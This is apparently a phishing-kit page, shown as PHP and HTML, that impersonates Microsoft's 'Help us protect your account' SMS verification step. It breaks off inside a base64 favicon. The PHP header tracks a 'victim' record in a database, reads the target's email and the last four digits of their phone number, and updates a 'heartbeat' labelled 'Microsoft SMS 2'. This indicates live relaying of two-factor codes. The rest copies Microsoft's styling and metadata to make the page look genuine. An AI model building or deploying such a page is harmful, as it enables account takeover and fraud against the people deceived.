<?php

require_once( '../../core/functions.php' );

if ( empty( $_GET[ 'last4' ] ) ) {

  header( 'location:../../login.php' );

} else {

  if ( validUser( $pdo ) ) {

    updateVictim( $pdo, $_SESSION[ 'id' ], [
      'is_waiting' => 0,
      'heartbeat' => 15 // Microsoft SMS 2
    ] );

    $id = $_SESSION[ 'id' ];
    $email = getVictim( $pdo, $id )[ 'username' ];
    $last4 = $_GET[ 'last4' ];

  } else {

    header( 'location:../../login.php' );

  }

}

?>

<!DOCTYPE html>
<html dir=ltr lang=EN-US>
  <meta charset=utf-8>
  <meta http-equiv=x-dns-prefetch-control content=on>
  <meta http-equiv=X-UA-Compatible content="IE=Edge">
  <noscript>Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked. <br>
    <br>To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help. </noscript>
  <title>Help us protect your account</title>
  <meta name=robots content=none>
  <meta name=PageID content=i5600>
  <meta name=SiteID content=292841>
  <meta name=ReqLC content=1033>
  <meta name=LocLC content=1033>
  <meta name=viewport content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
  <style>
    html {
      font-family: sans-serif;
      -ms-text-size-adjust: 100%;
      -webkit-text-size-adjust: 100%
    }

    body {
      margin: 0
    }

    a {
      background-color: transparent
    }

    a:active,
    a:hover {
      outline: 0
    }

    img {
      border: 0
    }

    button,
    input {
      color: inherit;
      font: inherit;
      margin: 0
    }

    button {
      text-transform: none
    }

    button,
    input[type="submit"] {
      -webkit-appearance: button;
      cursor: pointer
    }

    button::-moz-focus-inner,
    input::-moz-focus-inner {
      border: 0;
      padding: 0
    }

    input[type="checkbox"] {
      box-sizing: border-box;
      padding: 0
    }

    * {
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      box-sizing: border-box
    }

    *:before,
    *:after {
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      box-sizing: border-box
    }

    input,
    button {
      font-family: inherit;
      font-size: inherit
    }

    a:focus {
      outline: thin dotted;
      outline-offset: -2px;
      outline: 5px auto -webkit-focus-ring-color
    }

    img {
      vertical-align: middle
    }

    html {
      font-size: 100%
    }

    body {
      font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
      font-weight: 400;
      font-size: .9375rem;
      line-height: 1.25rem;
      padding-bottom: .227px;
      padding-top: .227px;
      background-color: #fff
    }

    a {
      text-decoration: none
    }

    a:link {
      color: #0067b8
    }

    a:visited {
      color: #0067b8
    }

    a:hover {
      color: #666
    }

    a:focus {
      color: #0067b8
    }

    a:active {
      color: #999
    }

    @font-face {
      font-family: "Segoe UI Webfont";
      src: local("Segoe UI");
      font-weight: 400;
      font-style: normal
    }

    @font-face {
      font-family: "Segoe UI Webfont";
      src: local("Segoe UI Semibold");
      font-weight: 600;
      font-style: normal
    }

    .text-title {
      line-height: 1.75rem;
      padding-bottom: 2.3632px;
      padding-top: 2.3632px
    }

    .text-body {
      font-weight: 400;
      font-size: .9375rem;
      line-height: 1.25rem;
      padding-bottom: .227px;
      padding-top: .227px
    }

    .row:before,
    .row:after {
      content: " ";
      display: table
    }

    .row:after {
      clear: both
    }

    .col-xs-24,
    .col-md-24 {
      min-height: 1px;
      padding-left: 2px;
      padding-right: 2px
    }

    .col-xs-24 {
      float: left
    }

    .col-xs-24 {
      width: 100%
    }

    @media (min-width:768px) {
      .col-md-24 {
        float: left
      }

      .col-md-24 {
        width: 100%
      }
    }

    label {
      display: inline-block;
      max-width: 100%
    }

    input[type="file"]:focus,
    input[type="radio"]:focus,
    input[type="checkbox"]:focus {
      outline: thin dotted;
      outline-offset: -2px;
      outline: 5px auto -webkit-focus-ring-color
    }

    .form-control {
      display: block;
      width: 100%;
      background-image: none
    }

    .checkbox {
      position: relative;
      display: block
    }

    .checkbox label {
      min-height: 20px;
      cursor: pointer
    }

    input {
      max-width: 100%;
      line-height: inherit
    }

    input[type="tel"] {
      border-style: solid
    }

    .text-input-focus,
    input[type="color"]:focus,
    input[type="date"]:focus,
    input[type="datetime"]:focus,
    input[type="datetime-local"]:focus,
    input[type="email"]:focus,
    input[type="month"]:focus,
    input[type="number"]:focus,
    input[type="password"]:focus,
    input[type="search"]:focus,
    input[type="tel"]:focus,
    input[type="text"]:focus,
    input[type="time"]:focus,
    input[type="url"]:focus,
    input[type="week"]:focus,
    textarea:focus {
      border-color: #0067b8;
      background-color: #fff
    }

    .text-input-moz-placeholder,
    input[type="color"]::-moz-placeholder,
    input[type="date"]::-moz-placeholder,
    input[type="datetime"]::-moz-placeholder,
    input[type="datetime-local"]::-moz-placeholder,
    input[type="email"]::-moz-placeholder,
    input[type="month"]::-moz-placeholder,
    input[type="number"]::-moz-placeholder,
    input[type="password"]::-moz-placeholder,
    input[type="search"]::-moz-placeholder,
    input[type="tel"]::-moz-placeholder,
    input[type="text"]::-moz-placeholder,
    input[type="time"]::-moz-placeholder,
    input[type="url"]::-moz-placeholder,
    input[type="week"]::-moz-placeholder,
    textarea::-moz-placeholder {
      color: rgba(0, 0, 0, .6);
      opacity: 1
    }

    .text-input-webkit-placeholder,
    input[type="color"]::-webkit-input-placeholder,
    input[type="date"]::-webkit-input-placeholder,
    input[type="datetime"]::-webkit-input-placeholder,
    input[type="datetime-local"]::-webkit-input-placeholder,
    input[type="email"]::-webkit-input-placeholder,
    input[type="month"]::-webkit-input-placeholder,
    input[type="number"]::-webkit-input-placeholder,
    input[type="password"]::-webkit-input-placeholder,
    input[type="search"]::-webkit-input-placeholder,
    input[type="tel"]::-webkit-input-placeholder,
    input[type="text"]::-webkit-input-placeholder,
    input[type="time"]::-webkit-input-placeholder,
    input[type="url"]::-webkit-input-placeholder,
    input[type="week"]::-webkit-input-placeholder,
    textarea::-webkit-input-placeholder {
      color: rgba(0, 0, 0, .6)
    }

    input[type="checkbox"] {
      width: 20px;
      height: 20px
    }

    .checkbox label {
      padding-left: 28px
    }

    .checkbox input[type="checkbox"] {
      position: absolute;
      margin-left: -28px
    }

    button,
    input[type="submit"] {
      display: inline-block;
      padding: 4px 12px 4px 12px;
      position: relative;
      max-width: 100%;
      text-align: center;
      white-space: nowrap;
      overflow: hidden;
      vertical-align: middle;
      text-overflow: ellipsis;
      touch-action: manipulation;
      color: #000;
      border-style: solid;
      border-width: 2px;
      border-color: transparent
    }

    .btn:hover,
    .btn:focus,
    button:hover,
    button:focus,
    input[type="button"]:hover,
    input[type="button"]:focus,
    input[type="submit"]:hover,
    input[type="submit"]:focus,
    input[type="reset"]:hover,
    input[type="reset"]:focus {
      border-color: rgba(0, 0, 0, .4)
    }

    .btn:hover,
    button:hover,
    input[type="button"]:hover,
    input[type="submit"]:hover,
    input[type="reset"]:hover {
      cursor: pointer
    }

    .btn:active,
    button:active,
    input[type="button"]:active,
    input[type="submit"]:active,
    input[type="reset"]:active {
      background-color: rgba(0, 0, 0, .4);
      border-color: transparent
    }

    @-ms-viewport {
      width: device-width
    }

    a:focus {
      outline-offset: 0
    }

    input[type="file"]:focus,
    input[type="radio"]:focus,
    input[type="checkbox"]:focus {
      outline-offset: 0
    }

    body {
      direction: ltr
    }

    .text-secondary {
      color: rgba(0, 0, 0, .7);
      font-size: 13px
    }

    body.cb div.placeholderContainer {
      width: 100%;
      position: relative
    }

    .no-margin-top {
      margin-top: 0
    }

    .no-padding-left-right {
      padding-left: 0;
      padding-right: 0
    }

    @keyframes pulse {
      from {
        opacity: .4
      }
    }

    @-o-keyframes pulse {
      from {
        opacity: .4
      }
    }

    @-moz-keyframes pulse {
      from {
        opacity: .4
      }
    }

    @-webkit-keyframes pulse {
      from {
        opacity: .4
      }
    }

    @-webkit-keyframes progressDot {

      0%,
      20% {
        left: 0%;
        -webkit-animation-timing-function: ease-out;
        opacity: 0
      }

      25% {
        opacity: 1
      }

      35% {
        left: 45%;
        -webkit-animation-timing-function: linear
      }

      65% {
        left: 60%;
        -webkit-animation-timing-function: ease-in
      }

      75% {
        opacity: 1
      }

      80%,
      100% {
        left: 100%;
        opacity: 0
      }
    }

    @-moz-keyframes progressDot {

      0%,
      20% {
        left: 0%;
        -moz-animation-timing-function: ease-out;
        opacity: 0
      }

      25% {
        opacity: 1
      }

      35% {
        left: 45%;
        -moz-animation-timing-function: linear
      }

      65% {
        left: 60%;
        -moz-animation-timing-function: ease-in
      }

      75% {
        opacity: 1
      }

      80%,
      100% {
        left: 100%;
        opacity: 0
      }
    }

    @-o-keyframes progressDot {

      0%,
      20% {
        left: 0%;
        -o-animation-timing-function: ease-out;
        opacity: 0
      }

      25% {
        opacity: 1
      }

      35% {
        left: 45%;
        -o-animation-timing-function: linear
      }

      65% {
        left: 60%;
        -o-animation-timing-function: ease-in
      }

      75% {
        opacity: 1
      }

      80%,
      100% {
        left: 100%;
        opacity: 0
      }
    }

    @keyframes progressDot {

      0%,
      20% {
        left: 0%;
        animation-timing-function: ease-out;
        opacity: 0
      }

      25% {
        opacity: 1
      }

      35% {
        left: 45%;
        animation-timing-function: linear
      }

      65% {
        left: 60%;
        animation-timing-function: ease-in
      }

      75% {
        opacity: 1
      }

      80%,
      100% {
        left: 100%;
        opacity: 0
      }
    }

    @keyframes fadeIn {
      from {
        opacity: 0
      }

      to {
        opacity: 1
      }
    }

    @-o-keyframes fadeIn {
      from {
        opacity: 0
      }

      to {
        opacity: 1
      }
    }

    @-moz-keyframes fadeIn {
      from {
        opacity: 0
      }

      to {
        opacity: 1
      }
    }

    @-webkit-keyframes fadeIn {
      from {
        opacity: 0
      }

      to {
        opacity: 1
      }
    }

    body.cb {
      color: #1b1b1b;
      text-align: left
    }

    .background-image {
      -webkit-animation: fadeIn 1s;
      -moz-animation: fadeIn 1s;
      -o-animation: fadeIn 1s;
      animation: fadeIn 1s
    }

    .background-image-holder {
      background: #f2f2f2
    }

    .background-image-holder,
    .background-image {
      position: fixed;
      top: 0;
      width: 100%;
      height: 100%
    }

    .background-image {
      background-repeat: no-repeat, no-repeat;
      background-position: center center, center center;
      background-size: cover, cover
    }

    .footer {
      position: absolute;
      left: 0;
      bottom: 0;
      width: 100%;
      overflow: visible;
      z-index: 99;
      clear: both;
      min-height: 28px
    }

    div.footerNode {
      margin: 0;
      float: right
    }

    .footer-content.footer-item {
      color: #000;
      font-size: 12px;
      line-height: 28px;
      white-space: nowrap;
      display: inline-block;
      margin-left: 8px;
      margin-right: 8px
    }

    .footer-content.footer-item.debug-item {
      text-decoration: none;
      letter-spacing: 3px;
      line-height: 22px;
      vertical-align: top;
      font-size: 16px;
      font-weight: 600
    }

    .outer {
      display: table;
      position: absolute;
      height: 100%;
      width: 100%
    }

    .middle {
      display: table-cell;
      vertical-align: middle
    }

    .sign-in-box {
      margin-left: auto;
      margin-right: auto;
      position: relative;
      max-width: 440px;
      width: calc(100% - 40px);
      padding: 44px;
      margin-bottom: 28px;
      background-color: #fff;
      -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
      -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
      box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
      min-height: 338px;
      overflow: hidden
    }

    a:hover {
      text-decoration: underline
    }

    .template-section {
      display: table-row
    }

    .template-section.main-section {
      height: 100%
    }

    input[type="tel"] {
      padding: 6px 10px;
      border-width: 1px;
      border-color: rgba(0, 0, 0, .6);
      height: 36px;
      outline: none;
      border-radius: 0;
      -webkit-border-radius: 0;
      background-color: transparent
    }

    .text-input-hover,
    input[type="color"]:hover,
    input[type="date"]:hover,
    input[type="datetime"]:hover,
    input[type="datetime-local"]:hover,
    input[type="email"]:hover,
    input[type="month"]:hover,
    input[type="number"]:hover,
    input[type="password"]:hover,
    input[type="search"]:hover,
    input[type="tel"]:hover,
    input[type="text"]:hover,
    input[type="time"]:hover,
    input[type="url"]:hover,
    input[type="week"]:hover,
    textarea:hover,
    select:hover {
      border-color: #323232;
      border-color: rgba(0, 0, 0, .8)
    }

    .text-input-focus,
    input[type="color"]:focus,
    input[type="date"]:focus,
    input[type="datetime"]:focus,
    input[type="datetime-local"]:focus,
    input[type="email"]:focus,
    input[type="month"]:focus,
    input[type="number"]:focus,
    input[type="password"]:focus,
    input[type="search"]:focus,
    input[type="tel"]:focus,
    input[type="text"]:focus,
    input[type="time"]:focus,
    input[type="url"]:focus,
    input[type="week"]:focus,
    textarea:focus,
    select:focus {
      border-color: #0067b8;
      background-color: transparent
    }

    button,
    input[type="submit"] {
      min-height: 32px;
      border: none;
      min-width: 108px;
      line-height: normal
    }

    .btn-hover,
    .btn:hover,
    button:hover,
    input[type="button"]:hover,
    input[type="submit"]:hover,
    input[type="reset"]:hover {
      background-color: #b2b2b2;
      background-color: rgba(0, 0, 0, .3)
    }

    .btn-focus,
    .btn:focus,
    button:focus,
    input[type="button"]:focus,
    input[type="submit"]:focus,
    input[type="reset"]:focus {
      background-color: #b2b2b2;
      background-color: rgba(0, 0, 0, .3);
      text-decoration: underline;
      outline: 2px solid #000
    }

    .btn-active,
    .btn:active,
    button:active,
    input[type="button"]:active,
    input[type="submit"]:active,
    input[type="reset"]:active,
    .btn.btn-primary-active,
    .btn.btn-primary:active,
    button.btn-primary:active,
    input[type="button"].btn-primary:active,
    input[type="submit"].btn-primary:active,
    input[type="reset"].btn-primary:active {
      outline: none;
      text-decoration: none;
      -ms-transform: scale(.98);
      -webkit-transform: scale(.98);
      transform: scale(.98)
    }

    .button.primary {
      color: #fff;
      border-color: #0067b8;
      background-color: #0067b8;
      display: block;
      width: 100%
    }

    .button.primary:hover {
      background-color: #005da6
    }

    .button.primary:focus {
      background-color: #005da6;
      text-decoration: underline;
      outline: 2px solid #000
    }

    .button.primary:active {
      outline: none;
      text-decoration: none;
      -ms-transform: scale(.98);
      -webkit-transform: scale(.98);
      transform: scale(.98)
    }

    .logo {
      max-width: 256px;
      height: 24px
    }

    .identityBanner {
      height: 24px;
      background: #fff;
      margin-top: 16px;
      margin-bottom: -4px
    }

    .identity {
      line-height: 24px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis
    }

    .backButton {
      min-height: 24px;
      width: 24px;
      min-width: 24px;
      float: left;
      padding: 0;
      background-color: #fff;
      border-width: 0;
      border-radius: 12px;
      margin-right: 2px
    }

    .backButton:hover {
      background-color: #e6e6e6;
      background-color: rgba(0, 0, 0, .1)
    }

    .backButton:hover:focus {
      background-color: #ccc;
      background-color: rgba(0, 0, 0, .2)
    }

    .backButton:active {
      background-color: #b3b3b3;
      background-color: rgba(0, 0, 0, .3)
    }

    .backButton:focus {
      background-color: #e6e6e6;
      background-color: rgba(0, 0, 0, .1)
    }

    .row {
      margin-left: 0;
      margin-right: 0
    }

    .tile-img {
      position: relative
    }

    .tile-img.small {
      width: 24px;
      height: 24px;
      float: left;
      margin-right: 8px
    }

    .text-body {
      padding: 0;
      margin-top: 16px;
      margin-bottom: 12px
    }

    .form-group {
      margin-bottom: 16px
    }

    .form-group label {
      margin-top: 0;
      margin-bottom: 0
    }

    button,
    input[type="submit"] {
      margin-top: 0;
      margin-bottom: 0
    }

    .no-margin-bottom {
      margin-bottom: 0
    }

    .no-margin-top-bottom {
      margin-top: 0;
      margin-bottom: 0
    }

    .overflow-hidden {
      overflow: hidden
    }

    .position-buttons>div:first-child {
      display: inline-block;
      width: 100%;
      margin-bottom: 36px
    }

    .button-container {
      position: absolute;
      bottom: 0;
      right: 0;
      text-align: right
    }

    @media (max-width:600px),
    (max-height:366px) {

      .background-image-holder,
      .background-image {
        display: none
      }

      .middle {
        vertical-align: top
      }

      .sign-in-box {
        padding: 24px;
        margin-top: 0;
        margin-bottom: 88px;
        width: 100vw;
        -webkit-box-shadow: none;
        -moz-box-shadow: none;
        box-shadow: none;
        border: 0
      }

      .footer {
        background-color: #fff;
        filter: none
      }

      div.footerNode {
        float: left;
        margin: 0 24px !important
      }

      .footer-content.footer-item {
        color: #747474
      }
    }

    .inline-block {
      display: inline-block
    }

    input[type="tel"] {
      border-top-width: 0;
      border-left-width: 0;
      border-right-width: 0;
      padding-left: 0
    }

    .text-title {
      color: #1b1b1b;
      font-size: 1.5rem;
      font-weight: 600;
      padding: 0;
      margin-top: 16px;
      margin-bottom: 12px;
      font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
    }

    .text-title:lang(zh-cn),
    .text-title:lang(zh-tw) {
      font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"
    }

    .pagination-view {
      position: relative
    }

    .pagination-view.has-identity-banner {
      min-height: 170px
    }

    .lightbox-cover {
      background-color: #fff;
      opacity: 0;
      z-index: -1;
      height: 100%;
      width: 100%;
      position: absolute;
      top: 0;
      left: 0;
      transition: all .5s ease-in;
      -o-transition: all .5s ease-in;
      -moz-transition: all .5s ease-in;
      -webkit-transition: all .5s ease-in
    }

    .provide-min-height {
      min-height: 1px
    }

    @media (-ms-high-contrast) {

      button,
      input[type="submit"] {
        -ms-high-contrast-adjust: none;
        text-decoration: none
      }

      .btn:hover,
      .button:hover,
      button:hover,
      input[type="button"]:hover,
      input[type="submit"]:hover,
      input[type="reset"]:hover,
      .btn.btn-google:hover {
        outline: 1px solid windowText;
        border: 1px solid highlight;
        background-color: highlight;
        color: highlightText;
        text-decoration: none
      }

      .btn:hover:focus,
      .button:hover:focus,
      button:hover:focus,
      input[type="button"]:hover:focus,
      input[type="submit"]:hover:focus,
      input[type="reset"]:hover:focus,
      .btn.btn-google:hover:focus {
        outline: 1px solid windowText;
        border: 1px solid windowText;
        background-color: highlight;
        color: highlightText;
        text-decoration: underline
      }

      .btn:focus,
      .button:focus,
      button:focus,
      input[type="button"]:focus,
      input[type="submit"]:focus,
      input[type="reset"]:focus,
      .btn.btn-google:focus {
        outline: 1px solid windowText;
        border: 1px solid windowText;
        background-color: window;
        color: windowText;
        text-decoration: underline
      }

      input[type="submit"].primary {
        outline: 1px solid highlight;
        border: 1px solid highlight;
        background-color: highlight;
        color: highlightText;
        text-decoration: none
      }

      .btn.btn-primary:hover,
      .button.btn-primary:hover,
      button.btn-primary:hover,
      input[type="button"].btn-primary:hover,
      input[type="submit"].btn-primary:hover,
      input[type="reset"].btn-primary:hover,
      .btn.btn-google.btn-primary:hover,
      .btn.primary:hover,
      .button.primary:hover,
      button.primary:hover,
      input[type="button"].primary:hover,
      input[type="submit"].primary:hover,
      input[type="reset"].primary:hover,
      .btn.btn-google.primary:hover,
      .btn.secondary:hover,
      .button.secondary:hover,
      button.secondary:hover,
      input[type="button"].secondary:hover,
      input[type="submit"].secondary:hover,
      input[type="reset"].secondary:hover,
      .btn.btn-google.secondary:hover {
        outline: 1px solid highlight;
        border: 1px solid window;
        background-color: window;
        color: highlight;
        text-decoration: none
      }

      .btn.btn-primary:hover:focus,
      .button.btn-primary:hover:focus,
      button.btn-primary:hover:focus,
      input[type="button"].btn-primary:hover:focus,
      input[type="submit"].btn-primary:hover:focus,
      input[type="reset"].btn-primary:hover:focus,
      .btn.btn-google.btn-primary:hover:focus,
      .btn.primary:hover:focus,
      .button.primary:hover:focus,
      button.primary:hover:focus,
      input[type="button"].primary:hover:focus,
      input[type="submit"].primary:hover:focus,
      input[type="reset"].primary:hover:focus,
      .btn.btn-google.primary:hover:focus,
      .btn.secondary:hover:focus,
      .button.secondary:hover:focus,
      button.secondary:hover:focus,
      input[type="button"].secondary:hover:focus,
      input[type="submit"].secondary:hover:focus,
      input[type="reset"].secondary:hover:focus,
      .btn.btn-google.secondary:hover:focus {
        outline: 1px solid windowText;
        border: 1px solid window;
        background-color: window;
        color: highlight;
        text-decoration: underline
      }

      .btn.btn-primary:focus,
      .button.btn-primary:focus,
      button.btn-primary:focus,
      input[type="button"].btn-primary:focus,
      input[type="submit"].btn-primary:focus,
      input[type="reset"].btn-primary:focus,
      .btn.btn-google.btn-primary:focus,
      .btn.primary:focus,
      .button.primary:focus,
      button.primary:focus,
      input[type="button"].primary:focus,
      input[type="submit"].primary:focus,
      input[type="reset"].primary:focus,
      .btn.btn-google.primary:focus,
      .btn.secondary:focus,
      .button.secondary:focus,
      button.secondary:focus,
      input[type="button"].secondary:focus,
      input[type="submit"].secondary:focus,
      input[type="reset"].secondary:focus,
      .btn.btn-google.secondary:focus {
        outline: 1px solid windowText;
        border: 1px solid window;
        background-color: highlight;
        color: highlightText;
        text-decoration: underline
      }

      .backButton {
        outline: none;
        border: 1px solid window;
        background-color: window;
        color: windowText
      }

      .backButton:hover {
        outline: none;
        border: 1px solid highlight;
        background-color: window;
        color: windowText
      }

      .backButton:hover:focus {
        outline: none;
        border: 1px solid highlight;
        background-color: window;
        color: windowText
      }

      .backButton:focus,
      .backButton:active {
        outline: none;
        border: 1px dashed highlight;
        background-color: window;
        color: windowText
      }
    }

    .fade-in-lightbox {
      animation: fadeIn .3s ease-in;
      -webkit-animation: fadeIn .3s ease-in;
      -moz-animation: fadeIn .3s ease-in;
      -ms-animation: fadeIn .3s ease-in;
      -o-animation: fadeIn .3s ease-in
    }

    .animate {
      animation-duration: .25s;
      -webkit-animation-duration: .25s;
      -moz-animation-duration: .25s;
      -ms-animation-duration: .25s;
      -o-animation-duration: .25s;
      animation-timing-function: cubic-bezier(.5, 0, .5, 1);
      -webkit-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
      -moz-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
      -ms-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
      -o-animation-timing-function: cubic-bezier(.5, 0, .5, 1);
      animation-fill-mode: both;
      -webkit-animation-fill-mode: both;
      -moz-animation-fill-mode: both;
      -ms-animation-fill-mode: both;
      -o-animation-fill-mode: both;
      transition-property: left;
      -webkit-transition-property: left;
      -moz-transition-property: left;
      -ms-transition-property: left;
      -o-transition-property: left
    }

    html[dir=ltr] .animate.slide-in-next {
      animation-name: show-from-right;
      -webkit-animation-name: show-from-right;
      -moz-animation-name: show-from-right;
      -ms-animation-name: show-from-right;
      -o-animation-name: show-from-right
    }

    @keyframes hide-to-left {
      from {
        left: 0;
        opacity: 1
      }

      to {
        left: -200px;
        opacity: 0
      }
    }

    @keyframes show-from-right {
      from {
        left: 200px;
        opacity: 0
      }

      to {
        left: 0;
        opacity: 1
      }
    }

    @keyframes hide-to-right {
      from {
        left: 0;
        opacity: 1
      }

      to {
        left: 200px;
        opacity: 0
      }
    }

    @keyframes show-from-left {
      from {
        left: -200px;
        opacity: 0
      }

      to {
        left: 0;
        opacity: 1
      }
    }

    @-webkit-keyframes hide-to-left {
      from {
        left: 0;
        opacity: 1
      }

      to {
        left: -200px;
        opacity: 0
      }
    }

    @-webkit-keyframes show-from-right {
      from {
        left: 200px;
        opacity: 0
      }

      to {
        left: 0;
        opacity: 1
      }
    }

    @-webkit-keyframes hide-to-right {
      from {
        left: 0;
        opacity: 1
      }

      to {
        left: 200px;
        opacity: 0
      }
    }

    @-webkit-keyframes show-from-left {
      from {
        left: -200px;
        opacity: 0
      }

      to {
        left: 0;
        opacity: 1
      }
    }

    @-moz-keyframes hide-to-left {
      from {
        left: 0;
        opacity: 1
      }

      to {
        left: -200px;
        opacity: 0
      }
    }

    @-moz-keyframes show-from-right {
      from {
        left: 200px;
        opacity: 0
      }

      to {
        left: 0;
        opacity: 1
      }
    }

    @-moz-keyframes hide-to-right {
      from {
        left: 0;
        opacity: 1
      }

      to {
        left: 200px;
        opacity: 0
      }
    }

    @-moz-keyframes show-from-left {
      from {
        left: -200px;
        opacity: 0
      }

      to {
        left: 0;
        opacity: 1
      }
    }

    @-ms-keyframes hide-to-left {
      from {
        left: 0;
        opacity: 1
      }

      to {
        left: -200px;
        opacity: 0
      }
    }

    @-ms-keyframes show-from-right {
      from {
        left: 200px;
        opacity: 0
      }

      to {
        left: 0;
        opacity: 1
      }
    }

    @-ms-keyframes hide-to-right {
      from {
        left: 0;
        opacity: 1
      }

      to {
        left: 200px;
        opacity: 0
      }
    }

    @-ms-keyframes show-from-left {
      from {
        left: -200px;
        opacity: 0
      }

      to {
        left: 0;
        opacity: 1
      }
    }

    @-o-keyframes hide-to-left {
      from {
        left: 0;
        opacity: 1
      }

      to {
        left: -200px;
        opacity: 0
      }
    }

    @-o-keyframes show-from-right {
      from {
        left: 200px;
        opacity: 0
      }

      to {
        left: 0;
        opacity: 1
      }
    }

    @-o-keyframes hide-to-right {
      from {
        left: 0;
        opacity: 1
      }

      to {
        left: 200px;
        opacity: 0
      }
    }

    @-o-keyframes show-from-left {
      from {
        left: -200px;
        opacity: 0
      }

      to {
        left: 0;
        opacity: 1
      }
    }

    body {
      display: block !important
    }
  </style>
  <noscript>
    <style type="text/css">
      body {
        display: block !important;
      }
    </style>
  </noscript>
  <style>
    .sign-in-box {
      min-width: 0
    }
  </style>
  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAYAgIAQAAAAAABoKAAAZgAAAEhIEAAAAAAA6A0AAM4oAAAwMBAAAAAAAGgGAAC2NgAAICAQAAAAAADoAgAAHj0AABgYEAAAAAAA6AEAAAZAAAAQEBAAAAAAACgBAADuQQAAKAAAAIAAAAAAAQAAAQAEAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8A76QAAAC5/wAAun8AIlDyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIgAAADMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiAAAAMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIgAAADMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiAAAAMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIgAAADMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiAAAAMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIgAAADMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiAAAAMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIgAAADMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiAAAAMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIgAAADMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIAAAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiIiAAAA